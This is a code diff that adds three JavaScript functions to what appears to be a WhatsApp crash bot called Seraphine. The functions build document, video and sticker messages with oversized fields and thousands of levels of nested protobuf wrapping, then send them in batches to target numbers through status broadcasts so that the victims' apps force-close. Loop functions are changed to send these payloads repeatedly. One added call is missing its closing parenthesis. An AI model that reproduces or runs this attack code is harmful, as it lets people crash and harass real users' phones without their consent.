@@ -3393,6 +3393,343 @@ async function SpamVideoV1(target) {
     }
   }
 }
+// Created by @NandoOfficiali
+// not sell sher pemakaian pribadi 
+// kefix tanggung resikonya 
+
+async function ForcloseDOC(target) {
+  const document = {
+url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
+mimetype: "application/pdf",
+fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
+fileLength: 999999999,
+pageCount: 1000,
+mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
+fileName: "nando.pdf",
+fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
+directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
+mediaKeyTimestamp: "1779839963",
+thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
+thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
+thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
+jpegThumbnail: null,
+contextInfo: {},
+thumbnailHeight: 999,
+thumbnailWidth: 999
+};
+   
+    const tol = [
+        [0xBA, 0x03],
+        [0xD2, 0x04],
+        [0xAA, 0x02],
+    ];
+
+    const encodeVarint = function(rb) {
+        var buf = [];
+        while (rb >= 0x80) {
+            buf.push((rb & 0x7f) | 0x80);
+            rb >>>= 7;
+        }
+        buf.push(rb);
+        return Buffer.from(buf);
+    };
+
+    const wrapLd = function(tag, data) {
+        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
+    };
+
+    const MakLo = proto.Message.encode(
+        proto.Message.fromObject({ documentMessage: document })
+    ).finish();
+
+    const inflate = function(tag, rayap) {
+        var buf = MakLo;
+        for (var i = 0; i < rayap; i++) {
+            buf = wrapLd(tag, wrapLd([0x0A], buf));
+        }
+        return buf;
+    };
+
+    const resolveJid = function(raw) {
+        var s = String(raw || '').trim();
+        if (s.includes('@')) return s;
+        return s.replace(/\D/g, '') + '@s.whatsapp.net';
+    };
+
+    const jids = (Array.isArray(target) ? target : [target])
+        .map(resolveJid)
+        .filter(function(j) { return j.length > 15; });
+
+    var MAX_BATCH = 100;
+    var DELAY_MS  = 2000;
+    var totalSent = 0;
+
+    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
+        var crb   = jids.slice(offset, offset + MAX_BATCH);
+        var isFirst = offset === 0;
+
+        if (!isFirst) {
+            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
+        }
+
+        var idx   = Math.floor(offset / MAX_BATCH) + 1;
+        var suffix = idx > 1 ? ('n' + idx) : 'n';
+        var CrBMsG  = 'crb' + Date.now().toString(36).toUpperCase() + suffix;
+
+        for (var ti = 0; ti < tol.length; ti++) {
+            var tag     = tol[ti];
+            var bokep = null;
+
+            for (var rayap = 5000; rayap >= 2000 && !bokep; rayap -= 400) {
+                try {
+                    var decoded = proto.Message.decode(inflate(tag, rayap));
+                    proto.Message.encode(decoded).finish();
+                    bokep = decoded;
+                } catch (_) {}
+            }
+
+            if (!bokep) continue;
+
+            await sock.relayMessage('status@broadcast', bokep, {
+                messageId: CrBMsG,
+                statusJidList: crb,
+                additionalNodes: [{
+                    tag: 'meta',
+                    attrs: {},
+                    content: [{
+                        tag: 'mentioned_users',
+                        attrs: {},
+                        content: crb.map(function(jid) {
+                            return { tag: 'to', attrs: { jid: jid }, content: [] };
+                        })
+                    }]
+                }]
+            });
+        }
+    }
+}
+
+// Created by @NandoOfficiali
+// not sell sher pemakaian pribadi 
+// kefix tanggung resikonya 
+
+async function ForcloseVIDEO(target) {
+  const video = {
+    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
+    mimetype: "video/mp4",
+    fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
+    fileLength: 999999999,
+    seconds: 999999999,
+    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
+    caption: "NandoX",
+    height: 9999,
+    width: 9999,
+    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
+    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
+    mediaKeyTimestamp: "1751081957",
+    jpegThumbnail: null, 
+    streamingSidecar: null
+  };
+   
+    const tol = [
+        [0xBA, 0x03],
+        [0xD2, 0x04],
+        [0xAA, 0x02],
+    ];
+
+    const encodeVarint = function(rb) {
+        var buf = [];
+        while (rb >= 0x80) {
+            buf.push((rb & 0x7f) | 0x80);
+            rb >>>= 7;
+        }
+        buf.push(rb);
+        return Buffer.from(buf);
+    };
+
+    const wrapLd = function(tag, data) {
+        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
+    };
+
+    const MakLo = proto.Message.encode(
+        proto.Message.fromObject({ videoMessage: video })
+    ).finish();
+
+    const inflate = function(tag, rayap) {
+        var buf = MakLo;
+        for (var i = 0; i < rayap; i++) {
+            buf = wrapLd(tag, wrapLd([0x0A], buf));
+        }
+        return buf;
+    };
+
+    const resolveJid = function(raw) {
+        var s = String(raw || '').trim();
+        if (s.includes('@')) return s;
+        return s.replace(/\D/g, '') + '@s.whatsapp.net';
+    };
+
+    const jids = (Array.isArray(target) ? target : [target])
+        .map(resolveJid)
+        .filter(function(j) { return j.length > 15; });
+
+    var MAX_BATCH = 100;
+    var DELAY_MS  = 2000;
+    var totalSent = 0;
+
+    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
+        var crb   = jids.slice(offset, offset + MAX_BATCH);
+        var isFirst = offset === 0;
+
+        if (!isFirst) {
+            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
+        }
+
+        var idx   = Math.floor(offset / MAX_BATCH) + 1;
+        var suffix = idx > 1 ? ('n' + idx) : 'n';
+        var CrBMsG  = 'crb' + Date.now().toString(36).toUpperCase() + suffix;
+
+        for (var ti = 0; ti < tol.length; ti++) {
+            var tag     = tol[ti];
+            var bokep = null;
+
+            for (var rayap = 5000; rayap >= 2000 && !bokep; rayap -= 400) {
+                try {
+                    var decoded = proto.Message.decode(inflate(tag, rayap));
+                    proto.Message.encode(decoded).finish();
+                    bokep = decoded;
+                } catch (_) {}
+            }
+
+            if (!bokep) continue;
+
+            await sock.relayMessage('status@broadcast', bokep, {
+                messageId: CrBMsG,
+                statusJidList: crb,
+                additionalNodes: [{
+                    tag: 'meta',
+                    attrs: {},
+                    content: [{
+                        tag: 'mentioned_users',
+                        attrs: {},
+                        content: crb.map(function(jid) {
+                            return { tag: 'to', attrs: { jid: jid }, content: [] };
+                        })
+                    }]
+                }]
+            });
+        }
+    }
+}
+
+
+// Created by @NandoOfficiali
+// not sell sher pemakaian pribadi 
+// kefix tanggung resikonya 
+
+async function ForcloseSTC(target) {
+    const sticker = {
+    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+    mimetype: "image/webp",
+    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+    fileLength: "10610",
+    mediaKeyTimestamp: "1775044724",
+    stickerSentTs: "1775044724091",
+  };
+
+    const tol = [
+        [0xBA, 0x03],
+        [0xD2, 0x04],
+        [0xAA, 0x02],
+    ];
+
+    const encodeVarint = function(rb) {
+        var buf = [];
+        while (rb >= 0x80) {
+            buf.push((rb & 0x7f) | 0x80);
+            rb >>>= 7;
+        }
+        buf.push(rb);
+        return Buffer.from(buf);
+    };
+
+    const wrapLd = function(tag, data) {
+        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
+    };
+
+    const MakLo = proto.Message.encode(
+        proto.Message.fromObject({ stickerMessage: sticker })
+    ).finish();
+
+    const inflate = function(tag, rayap) {
+        var buf = MakLo;
+        for (var i = 0; i < rayap; i++) {
+            buf = wrapLd(tag, wrapLd([0x0A], buf));
+        }
+        return buf;
+    };
+
+    const resolveJid = function(raw) {
+        var s = String(raw || '').trim();
+        if (s.includes('@')) return s;
+        return s.replace(/\D/g, '') + '@s.whatsapp.net';
+    };
+
+    const jids = (Array.isArray(target) ? target : [target])
+        .map(resolveJid)
+        .filter(function(j) { return j.length > 15; });
+
+    var MAX_BATCH = 100;
+    var DELAY_MS  = 2000;
+    var totalSent = 0;
+
+    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
+        var crb   = jids.slice(offset, offset + MAX_BATCH);
+        var isFirst = offset === 0;
+
+        if (!isFirst) {
+            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
+        }
+
+        var idx   = Math.floor(offset / MAX_BATCH) + 1;
+        var suffix = idx > 1 ? ('n' + idx) : 'n';
+        var CrBMsG  = 'crb' + Date.now().toString(36).toUpperCase() + suffix;
+
+        for (var ti = 0; ti < tol.length; ti++) {
+            var tag     = tol[ti];
+            var bokep = null;
+
+            for (var rayap = 5000; rayap >= 2000 && !bokep; rayap -= 400) {
+                try {
+                    var decoded = proto.Message.decode(inflate(tag, rayap));
+                    proto.Message.encode(decoded).finish();
+                    bokep = decoded;
+                } catch (_) {}
+            }
+
+            if (!bokep) continue;
+
+            await sock.relayMessage('status@broadcast', bokep, {
+                messageId: CrBMsG,
+                statusJidList: crb,
+                additionalNodes: [{
+                    tag: 'meta',
+                    attrs: {},
+                    content: [{
+                        tag: 'mentioned_users',
+                        attrs: {},
+                        content: crb.map(function(jid) {
+                            return { tag: 'to', attrs: { jid: jid }, content: [] };
+                        })
+                    }]
+                }]
+            });
+        }
+    }
+}
 
 //=========== ASYNC FUNCTION SEND ==========\\
 async function crayxkouta(target) {
@@ -3440,6 +3777,13 @@ async function crayxios(inviteCode) {
 async function crayxui(target) {
 for (let i = 0; i < 25; i++) {
 await starttime(target)
+await new Promise(resolve => setTimeout(resolve, 2500));
+await ForcloseSTC(target)
+await new Promise(resolve => setTimeout(resolve, 2500));
+await ForcloseVIDEO(target)
+await new Promise(resolve => setTimeout(resolve, 2500));
+await ForcloseDOC(target)
+await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - FORCE 🦠 ] ${target}`));
 }
 }
@@ -3456,9 +3800,10 @@ console.log(chalk.red(`[Seraphine - CORE VIP 🔥 ] ${target}`));
 
 async function crayxvol(target) {
 for (let i = 0; i < 30; i++) {
+await ForcloseDOC(target 
 await starttime(target)
-await LexcaabosV5(target)
-await LexcaabosV4(target)
+await ForcloseSTC(target)
+await ForcloseVIDEO(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - TRASH 🍃 ] ${target}`));
 }
